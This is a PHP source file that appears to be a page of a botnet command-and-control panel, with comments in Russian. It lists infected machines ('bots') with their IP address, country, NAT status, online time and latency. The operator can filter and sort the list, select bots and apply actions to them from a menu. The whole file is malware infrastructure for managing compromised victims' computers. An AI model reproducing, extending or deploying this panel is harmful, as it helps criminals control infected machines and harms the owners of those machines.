<?php if(!defined('__CP__'))die();

define('BOTS_PER_PAGE',       50); //Количетсво ботов на страницу.
define('BOTSLIST_ROWS_COUNT', 10); //Количетсво столбцов в  списке ботов.

$_FULL_QUERY = QUERY_STRING; //Строка полного запроса.

///////////////////////////////////////////////////////////////////////////////
// Определяем данные для фильтра.
///////////////////////////////////////////////////////////////////////////////
$_FILTER['bots']      = isset($_GET['bots'])      ? $_GET['bots']      : '';
$_FILTER['botnets']   = isset($_GET['botnets'])   ? $_GET['botnets']   : '';
$_FILTER['ips']       = isset($_GET['ips'])       ? $_GET['ips']       : '';
$_FILTER['countries'] = isset($_GET['countries']) ? $_GET['countries'] : '';

$_FILTER['nat']      = isset($_GET['nat'])      ? intval($_GET['nat'])      : 1;
$_FILTER['online']   = isset($_GET['online'])   ? intval($_GET['online'])   : 1;
$_FILTER['install']  = isset($_GET['install'])  ? intval($_GET['install'])  : 0;
$_FILTER['used']     = isset($_GET['used'])     ? intval($_GET['used'])     : 0;
$_FILTER['comments'] = isset($_GET['comments']) ? intval($_GET['comments']) : 0;

foreach($_FILTER as $k => $i)$_FULL_QUERY .= '&'.$k.'='.urlencode($i);

///////////////////////////////////////////////////////////////////////////////
// Определяем данные текущей сортировки.
///////////////////////////////////////////////////////////////////////////////

$js_sort = addjsslashes($_FULL_QUERY);
$_FULL_QUERY .= AssocateSortMode(array('bot_id', 'botnet', 'bot_version', 'ipv4', 'country', 'rtime_online', 'net_latency', 'comments'));
$js_page = addjsslashes($_FULL_QUERY);

///////////////////////////////////////////////////////////////////////////////
// JavaScript скрипты.
///////////////////////////////////////////////////////////////////////////////

$js_script = JSCheckAll('botslist', 'checkall', 'bots[]').
             JSSetSortMode($js_sort).
             "function ChangePage(p){window.location='{$js_page}&page=' + p; return false;}";

///////////////////////////////////////////////////////////////////////////////
// Создание запроса.
///////////////////////////////////////////////////////////////////////////////
$q = array();
if($_FILTER['nat'] > 0)     $q[] = "flag_nat='".($_FILTER['nat'] == 1 ? 0 : 1)."'";
if($_FILTER['install'] > 0) $q[] = "flag_install='".($_FILTER['install'] == 1 ? 1 : 0)."'";
if($_FILTER['used'] > 0)    $q[] = "flag_used='".($_FILTER['used'] == 1 ? 1 : 0)."'";
if($_FILTER['online'] > 0)  $q[] = "rtime_last".($_FILTER['online'] == 1 ? '>=' : '<')."'".ONLINE_TIME_MIN."'";
if($_FILTER['comments'] > 0)$q[] = "LENGTH(comments)".($_FILTER['comments'] == 1 ? '>' : '=')."'0'";

$q[] = ExpToSQL($_FILTER['bots'],      'bot_id',  0, 1);
$q[] = ExpToSQL($_FILTER['botnets'],   'botnet',  0, 1);
$q[] = ExpToSQL($_FILTER['ips'],       'ipv4',    1, 1);
$q[] = ExpToSQL($_FILTER['countries'], 'country', 0, 1);

//Чистим массив.
foreach($q as $k => $v)if($v == '')unset($q[$k]);

$query1 = count($q) > 0 ? 'WHERE '.implode(' AND ', $q) : '';
$query2 = $query1.' ORDER BY '.$_SORT_COLUMN.($_SORT_ORDER == 0 ? ' ASC' : ' DESC');
if($_SORT_COLUMN_ID != 0)$query2 .= ', bot_id'.($_SORT_ORDER == 0 ? ' ASC' : ' DESC');
unset($q);

///////////////////////////////////////////////////////////////////////////////
// Вывод списка.
///////////////////////////////////////////////////////////////////////////////

//Данные о странице.
$cur_page   = (!empty($_GET['page']) && is_numeric($_GET['page']) ? $_GET['page'] : 1);
$page_count = 0;
$page_list  = '';
$bots_count = 0;

//Запрос 1.
$r = @mysql_query('SELECT COUNT(*) FROM botnet_list '.$query1);
if(($mt = @mysql_fetch_row($r)))
{
  //Создание списка страниц.
  if(($page_count = ceil($mt[0] / BOTS_PER_PAGE)) > 1)
  {
    $page_list = 
    THEME_DIALOG_ROW_BEGIN.
      str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
        ShowPageList($page_count, $cur_page, 'return ChangePage({P})').
      THEME_DIALOG_ITEM_CHILD_END.
    THEME_DIALOG_ROW_END;
  }
  $bots_count = $mt[0];
}

//Запрос 2.
$bots_list = '';
$offset = (($cur_page - 1) * BOTS_PER_PAGE);
if(!$r ||
   !($r = @mysql_query('SELECT bot_id, botnet, bot_version, flag_nat, ipv4, country, rtime_online, IF(rtime_last>=\''.ONLINE_TIME_MIN.'\', 1, 0), net_latency, comments FROM botnet_list '.$query2.' LIMIT '.$offset.', '.BOTS_PER_PAGE)) ||
   @mysql_affected_rows() === 0)
{
  $bots_list .=
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(BOTSLIST_ROWS_COUNT, $r ? LNG_BOTNET_LIST_EMPTY : mysql_error_ex()), THEME_LIST_ITEM_EMPTY_1).
  THEME_LIST_ROW_END;
}
//Вывод результата.
else
{
  $i = 0;
  while(($mt = @mysql_fetch_row($r)))
  {
    $theme_text = $i % 2 ? THEME_LIST_ITEM_LTEXT_U2            : THEME_LIST_ITEM_LTEXT_U1;
    $theme_num  = $i % 2 ? THEME_LIST_ITEM_RTEXT_U2            : THEME_LIST_ITEM_RTEXT_U1;
    $theme_cb   = $i % 2 ? THEME_LIST_ITEM_INPUT_CHECKBOX_1_U2 : THEME_LIST_ITEM_INPUT_CHECKBOX_1_U1;
    
    $bots_list .=
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{NAME}', '{VALUE}', '{JS_EVENTS}'), array('bots[]', htmlentities_ex($mt[0]), ''),                             $theme_cb).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', number_format_as_int(++$offset)),                                          $theme_num).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', BotPopupMenu($mt[0], 'botmenu')),                                          $theme_text).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex($mt[1])),                                                  $theme_text).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', IntToVersion($mt[2])),                                                     $theme_text).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex($mt[4]).($mt[3] ? '*' : '')),                              $theme_text).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex($mt[5])),                                                  $theme_text).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $mt[7] == 1 ? TickCountToTime(CURRENT_TIME - $mt[6]) : LNG_FORMAT_NOTIME), $theme_num).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', number_format_as_float($mt[8] / 1000, 3)),                                 $theme_num).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', empty($mt[9]) ? '-' : htmlentities_ex($mt[9])),                            $theme_text).
    THEME_LIST_ROW_END;  
    
    $i++;
  }
}

///////////////////////////////////////////////////////////////////////////////
// Создание списока дейтвий.
///////////////////////////////////////////////////////////////////////////////

$actions = '';
if($page_count > 0 && count($_BOT_MENU) > 0)
{
  $data = LNG_BOTNET_BOTSACTION.'&#160;'.str_replace(array('{NAME}', '{WIDTH}'), array('botsaction', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN);
  foreach($_BOT_MENU as $item)$data .= str_replace(array('{VALUE}', '{TEXT}'), array($item[0], $item[1]), THEME_DIALOG_ITEM_LISTBOX_ITEM);
  $data .= THEME_DIALOG_ITEM_LISTBOX_END.'&#160;'.str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_ACTION_APPLY, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT);
  $actions = THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', $data, THEME_DIALOG_ITEM_TEXT).THEME_DIALOG_ROW_END;
}

///////////////////////////////////////////////////////////////////////////////
// Вывод.
///////////////////////////////////////////////////////////////////////////////
define('INPUT_WIDTH',  '250px'); //Ширина input.text.
define('SELECT_WIDTH', '150px'); //Ширина select.

ThemeBegin(LNG_BOTNET, $js_script, GetBotJSMenu('botmenu'), 0);
echo

//Фильтр.
str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('filter', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_BEGIN).
  FORM_CURRENT_MODULE.
  str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_BOTNET_FILTER_TITLE), THEME_DIALOG_TITLE).
    THEME_DIALOG_ROW_BEGIN.
      str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_GROUP_BEGIN).
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_FILTER_BOTS, THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'bots',      htmlentities_ex($_FILTER['bots']),      512), THEME_DIALOG_ITEM_INPUT_TEXT).
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_FILTER_BOTNETS, THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'botnets',   htmlentities_ex($_FILTER['botnets']),   512), THEME_DIALOG_ITEM_INPUT_TEXT).
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_FILTER_IPS, THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'ips',       htmlentities_ex($_FILTER['ips']),       512), THEME_DIALOG_ITEM_INPUT_TEXT).
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_FILTER_COUNTRIES, THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'countries', htmlentities_ex($_FILTER['countries']), 512), THEME_DIALOG_ITEM_INPUT_TEXT).
        THEME_DIALOG_ROW_END.
      THEME_DIALOG_GROUP_END.
      str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_GROUP_BEGIN).
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_FILTER_NAT, THEME_DIALOG_ITEM_TEXT).
          str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
            str_replace(array('{NAME}', '{WIDTH}'), array('nat', SELECT_WIDTH), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
              str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_BOTNET_FILTER_ALL),         $_FILTER['nat'] == 0 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_BOTNET_FILTER_NAT_OUTSIDE), $_FILTER['nat'] == 1 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(2, LNG_BOTNET_FILTER_NAT_INSIDE),  $_FILTER['nat'] == 2 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
            THEME_DIALOG_ITEM_LISTBOX_END.
          THEME_DIALOG_ITEM_CHILD_END.
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_FILTER_ONLINE, THEME_DIALOG_ITEM_TEXT).
          str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
            str_replace(array('{NAME}', '{WIDTH}'), array('online', SELECT_WIDTH), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
              str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_BOTNET_FILTER_ALL),            $_FILTER['online'] == 0 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_BOTNET_FILTER_ONLINE_ONLINE),  $_FILTER['online'] == 1 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(2, LNG_BOTNET_FILTER_ONLINE_OFFLINE), $_FILTER['online'] == 2 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
            THEME_DIALOG_ITEM_LISTBOX_END.
          THEME_DIALOG_ITEM_CHILD_END.
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_FILTER_INSTALL, THEME_DIALOG_ITEM_TEXT).
          str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
            str_replace(array('{NAME}', '{WIDTH}'), array('install', SELECT_WIDTH), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
              str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_BOTNET_FILTER_ALL),           $_FILTER['install'] == 0 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_BOTNET_FILTER_INSTALL_TRUE),  $_FILTER['install'] == 1 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(2, LNG_BOTNET_FILTER_INSTALL_FALSE), $_FILTER['install'] == 2 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
            THEME_DIALOG_ITEM_LISTBOX_END.
          THEME_DIALOG_ITEM_CHILD_END.
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_FILTER_USED, THEME_DIALOG_ITEM_TEXT).
          str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
            str_replace(array('{NAME}', '{WIDTH}'), array('used', SELECT_WIDTH), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
              str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_BOTNET_FILTER_ALL),        $_FILTER['used'] == 0 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_BOTNET_FILTER_USED_TRUE),  $_FILTER['used'] == 1 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(2, LNG_BOTNET_FILTER_USED_FALSE), $_FILTER['used'] == 2 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
            THEME_DIALOG_ITEM_LISTBOX_END.
          THEME_DIALOG_ITEM_CHILD_END.
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_FILTER_COMMENTS, THEME_DIALOG_ITEM_TEXT).
          str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
            str_replace(array('{NAME}', '{WIDTH}'), array('comments', SELECT_WIDTH), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
              str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_BOTNET_FILTER_ALL),            $_FILTER['comments'] == 0 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_BOTNET_FILTER_COMMENTS_TRUE),  $_FILTER['comments'] == 1 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(2, LNG_BOTNET_FILTER_COMMENTS_FALSE), $_FILTER['comments'] == 2 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
            THEME_DIALOG_ITEM_LISTBOX_END.
          THEME_DIALOG_ITEM_CHILD_END.
        THEME_DIALOG_ROW_END.
      THEME_DIALOG_GROUP_END.
    THEME_DIALOG_ROW_END.
    str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN).
      str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_BOTNET_FILTER_RESET, ''), THEME_DIALOG_ITEM_ACTION_RESET).
      '&#160;'.
      str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_BOTNET_FILTER_SUBMIT, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
    THEME_DIALOG_ACTIONLIST_END.
  THEME_DIALOG_END.
  AddSortModeToForm().
THEME_FORMGET_END.

THEME_VSPACE.

//Результат.
str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('botslist', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_TO_NEW_BEGIN).
str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
  str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1,  sprintf(LNG_BOTNET_LIST, number_format_as_int($bots_count))), THEME_DIALOG_TITLE).
  $page_list.
  $actions.
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
      str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN).
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{WIDTH}'), array(1, 'checkall', 1, ' onclick="CheckAll()"', 'auto'), THEME_LIST_HEADER_CHECKBOX_1).
          str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, '#', 'auto'),                                                              THEME_LIST_HEADER_R).
          WriteSortColumn(LNG_BOTNET_LIST_BOTID,      0, 0).
          WriteSortColumn(LNG_BOTNET_LIST_BOTNET,     1, 0).
          WriteSortColumn(LNG_BOTNET_LIST_VERSION,    2, 0).
          WriteSortColumn(LNG_BOTNET_LIST_IPV4,       3, 0).
          WriteSortColumn(LNG_BOTNET_LIST_CONTRY,     4, 0).
          WriteSortColumn(LNG_BOTNET_LIST_ONLINETIME, 5, 1).
          WriteSortColumn(LNG_BOTNET_LIST_LATENCY,    6, 1).
          WriteSortColumn(LNG_BOTNET_LIST_COMMENTS,   7, 0).
        THEME_LIST_ROW_END.
        $bots_list.
      THEME_LIST_END.
    THEME_DIALOG_ITEM_CHILD_END.
  THEME_DIALOG_ROW_END.
THEME_DIALOG_END.
THEME_FORMGET_END;
ThemeEnd();
die();
?>